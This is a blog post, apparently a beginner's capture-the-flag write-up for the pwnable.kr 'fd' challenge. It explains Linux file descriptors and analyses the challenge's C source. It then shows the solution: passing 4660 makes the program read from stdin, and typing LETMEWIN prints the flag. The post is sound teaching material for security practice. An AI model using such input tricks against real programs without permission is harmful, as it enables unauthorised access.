---
title: Pwnable.kr - fd (Toddler’s Bottle)
author: H0j3n
date: 2023-02-10 00:00:00
categories: [Pwn]
tags: [Pwn]
render_with_liquid: false
---

### Introduction

> Mommy! what is a file descriptor in Linux?
>
> ssh fd@pwnable.kr -p2222 (pw:guest)

I am just starting my journey in the world of binary exploitation and pwn CTF challenges. Despite being a novice, I will share my experience and understanding in this blog. This series is a great starting point for beginners.

### What is File Descriptors (fd) ?

*File descriptor* is a low-level mechanism used by an operating system to represent an open file or other input/output resource. It is non-negative integer that is assigned by the operating system when a file or resource is opened, and it can be used to refer to that file or resource for subsequent operations.

> `Standard input (stdin)` : This is file descriptior `0` and it is used to read input from the keyboard.
{: .prompt-info }

> `Standard output (stdout)` : This is file descriptor `1` and it is used to write output to the terminal.
{: .prompt-info }

> `Standard error (stderr)` : This is file descriptor `2` and it is used to write error messages to the terminal.
{: .prompt-info }

### Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

This is a simple C program that reads from a file descriptor (fd), specified as a CLI argument. The programs tell the user to pass a number as `argv[1]`.

It will convert the argument to an integer using `atoi` function, subtracts 0x1234 from it and stores the result in the `fd` variable.

Next, the program uses the `read` function to read up to 32 bytes of data from the `fd` variable and stores the results in the `buf` buffer.

The contents of the `buf` are then compare to the string `"LETMEWIN"` using the `strcmp` function. It will executes the `/bin/cat flag` if the contents are equal.

> `atoi()` : ASCII to integer. Convert a string of characters representing an integer to an actual integer value.
{: .prompt-info }

### Solution

If we send a random number, we will get the message `learn about Linux file IO`.

```bash
fd@pwnable:~$ ./fd 9999
learn about Linux file IO
```

If we look carefully the original `read()` function it has the following signature

```c
ssize_t read(int fd, void *buf, size_t count);
```

From our input, we need to ensure the `fd` variable later will hold the value of `0` for `stdin`. The value should be `4660`.

```bash
0x1234 = 4660

fd = atoi( argv[1] ) - 0x1234
fd = atoi('4660') - 4660
fd = 4660 - 4660
fd = 0
```

To get the result, we need to run the program with argument `4660` and ensure the input contains the string `LETMEWIN`. If everything is set up correctly, executing the the program will display as below.

```bash
fd@pwnable:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```
